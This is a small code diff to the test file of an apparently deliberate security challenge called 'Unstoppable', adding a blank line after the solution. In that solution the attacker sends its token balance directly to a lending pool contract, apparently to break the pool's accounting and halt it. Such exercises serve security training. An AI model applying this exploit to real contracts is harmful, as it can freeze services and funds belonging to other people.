@@ -42,6 +42,7 @@ describe('[Challenge] Unstoppable', function () {
         /** CODE YOUR EXPLOIT HERE */
         const attackContract = this.token.connect(attacker)
         await attackContract.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE)
+        
     });
 
     after(async function () {
